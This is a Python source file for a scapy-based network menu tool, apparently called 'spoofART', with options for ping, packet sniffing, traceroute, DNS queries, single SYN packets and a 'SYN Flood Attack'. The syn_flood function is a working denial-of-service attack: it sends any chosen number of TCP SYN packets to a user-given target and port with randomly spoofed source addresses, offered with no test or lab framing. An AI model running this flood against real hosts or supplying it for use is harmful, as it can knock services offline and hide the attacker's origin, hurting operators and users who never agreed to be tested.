#!/usr/bin/env python3

from scapy.all import *
import random
import sys
import os
from colorama import Fore, Style

os.system("clear")
print(Style.BRIGHT+Fore.YELLOW+"""
                     __  _   ___ _____ 
  ____ __  ___  ___ / _|/_\ | _ \_   _|
 (_-< '_ \/ _ \/ _ \  _/ _ \|   / | |  
 /__/ .__/\___/\___/_|/_/ \_\_|_\ |_|  
    |_|                                
-----------------------------------------

[☆]Developed by VictorON00
[☆]Github: https://github.com/VictorON00
""")

def ping_target(target):
    ip = IP(dst=target)
    icmp = ICMP()
    packet = ip/icmp
    response = sr1(packet, timeout=2, verbose=0)
    if response:
        print("Response from {target}:"+Fore.GREEN)
        response.show()
    else:
        print(Fore.RED+f"No response from {target}"+Fore.RESET)

def sniff_packets(count):
    def packet_callback(packet):
        packet.show()
    
    print(Fore.CYAN+f"Capturing {count} packets..."+Fore.GREEN)
    sniff(prn=packet_callback, count=count)

def send_tcp_syn(target, port):
    ip = IP(dst=target)
    tcp = TCP(dport=port, flags="S")
    packet = ip/tcp
    send(packet, verbose=0)
    print(Fore.GREEN+f"TCP SYN packet sent to {target} on port {port}"+Fore.RESET)

def syn_flood(target, port, packet_count):
    print(Fore.CYAN+f"Starting SYN Flood attack on {target}:{port} with {packet_count} packets..."+Fore.RESET)
    for _ in range(packet_count):
        ip = IP(src=str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)), dst=target)
        tcp = TCP(dport=port, flags="S")
        packet = ip/tcp
        send(packet, verbose=0)
    print(Fore.GREEN+f"Sent {packet_count} TCP SYN packets to {target} on port {port}"+Fore.RESET)

def traceroute_target(target):
    print(Fore.GREEN)
    result, _ = traceroute(target, maxttl=20, verbose=0)
    result.show()
    print(Fore.RESET)

def dns_query(domain):
    dns_request = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    dns_response = sr1(dns_request, verbose=0)
    if dns_response and dns_response.haslayer(DNS):
        print(f"DNS Response for {domain}:"+Fore.GREEN)
        dns_response.show()
    else:
        print(Fore.RED+f"No DNS response for {domain}"+Fore.RESET)

def main():
    while True:
        print("_"*41+Fore.RESET)
        print(Fore.MAGENTA+"\nChoose an option:")
        print("1. Ping")
        print("2. Sniff Network Packets")
        print("3. Send TCP SYN Packet")
        print("4. SYN Flood Attack")
        print("5. Traceroute")
        print("6. DNS Query")
        print("7. Exit")
        
        choice = input(Fore.WHITE+"Enter your choice [1,2,3,4,5,6,7]: "+Fore.RESET)
        
        if choice == '1':
            target = input("Enter the target (IP or domain): ")
            ping_target(target)
        elif choice == '2':
            count = int(input("Enter the number of packets to capture: "))
            sniff_packets(count)
        elif choice == '3':
            target = input("Enter the target (IP or domain): ")
            port = int(input("Enter the destination port: "))
            send_tcp_syn(target, port)
        elif choice == '4':
            target = input("Enter the target (IP or domain): ")
            port = int(input("Enter the destination port: "))
            packet_count = int(input("Enter the number of packets to send: "))
            syn_flood(target, port, packet_count)
        elif choice == '5':
            target = input("Enter the target (IP or domain): ")
            traceroute_target(target)
        elif choice == '6':
            domain = input("Enter the domain for DNS query: ")
            dns_query(domain)
        elif choice == '7':
            print(Fore.CYAN+"Exiting..."+Fore.RESET)
            sys.exit()
        else:
            print(Fore.RED+"Invalid choice. Please try again."+Fore.RESET)

if __name__ == "__main__":
    main()
